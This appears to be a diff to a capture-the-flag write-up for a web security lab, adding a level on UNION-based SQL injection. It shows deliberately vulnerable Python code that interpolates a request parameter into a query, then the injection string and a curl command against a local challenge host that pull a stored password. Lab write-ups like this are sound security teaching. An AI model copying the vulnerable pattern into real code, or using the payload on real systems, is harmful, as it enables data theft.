@@ -108,3 +108,30 @@ Then I pull the session cookie out and follow the redirect,
 ```sh
 curl -v -b session=eyJ1c2VyIjoxfQ.ZnCLHA.yyxgmZ5gotlukXOhlRf99GfV4RU http://challenge.localhost:80
 ```
+
+## Level 5 - SQL injection using UNION
+
+The code for this level,
+
+```python
+def level5():
+    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
+                'SELECT "flag" AS username, ? AS password'),
+               (flag,))
+
+    query = request.args.get("query", "%")
+    users = db.execute(f'SELECT username FROM users WHERE username LIKE "{query}"').fetchall()
+    return "".join(f'{user["username"]}\n' for user in users)
+```
+
+In this case, I want to take advantage of the `query` parameter to create a SQL statement,
+
+```sql
+SELECT username FROM users WHERE username LIKE "" UNION SELECT password FROM users --"
+```
+
+I form this in `curl`,
+
+```sh
+curl -v http://challenge.localhost:80?query=%22%20UNION%20SELECT%20password%20FROM%20users%20--
+```
